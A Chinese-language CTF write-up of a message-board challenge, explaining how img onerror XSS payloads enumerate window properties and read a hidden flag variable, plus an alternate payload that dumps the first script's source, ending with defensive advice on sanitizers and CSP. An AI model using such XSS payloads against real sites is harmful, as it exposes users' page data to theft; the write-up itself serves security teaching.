# At0m 的留言板

## 题目简述

留言内容会被渲染进页面，但过滤规则仍允许 `<img>` 及其事件属性，因而存在 XSS。flag 已作为 `var` 声明的全局变量放入模板的首个 `<script>` 中，不过变量名不是固定的 `flag`；需要先枚举 `window` 属性找到真实变量名，再读取变量值。

## 解题过程

模板给出的提示代码刻意使用了两种声明方式：

```html
<script>
    let auth0r = 'at0m';
    var flag = 'hgame{xxx}';
</script>
```

顶层 `let` 不会成为 `window` 的属性，而传统脚本中的顶层 `var` 会。因此，先通过未被过滤的图片错误事件，把全局属性名输出到留言内容区域：

```html
<img src=1 onerror="document.getElementsByClassName('content')[0].innerText=Object.keys(window)">
```

在返回的长列表末尾可以看到异常变量名：

```text
F149_is_Here
```

再提交第二条 payload，直接把该变量的值写入页面：

```html
<img src=1 onerror="document.getElementsByClassName('content')[0].innerText=F149_is_Here">
```

页面随后显示当前实例的 flag。若变量名随实例变化，应始终以第一步的枚举结果为准，不要硬编码 `F149_is_Here`。

还有一种非预期方法：把页面第一个脚本节点的文本追加到可见区域，从源码中同时取得变量声明和值：

```html
<img src=1 onerror="document.getElementsByClassName('content')[0].textContent+=document.scripts[0].text">
```

官方题解展示的是属性列表截图和示例值，并未留下可离线验证的实际 flag；这些截图只承载文字结果，已完整转写为上述 payload 和输出，因此不再保留为图片。公开参赛题解也验证了“读取首个脚本内容”的替代路线：[HGAME 2022 Week2 writeup](https://pankas.top/2022/02/03/week2-pankas/)。

## 方法总结

题目的两个知识点分别是 XSS 过滤绕过和浏览器全局作用域差异。仅过滤部分标签而保留事件处理属性并不安全；应采用经过审计的 HTML 净化器、按输出上下文编码，并用 CSP 限制内联脚本。敏感数据也不应预先写入 DOM 或 JavaScript 上下文，因为一旦出现 XSS，攻击脚本与页面脚本拥有相同的读取权限。
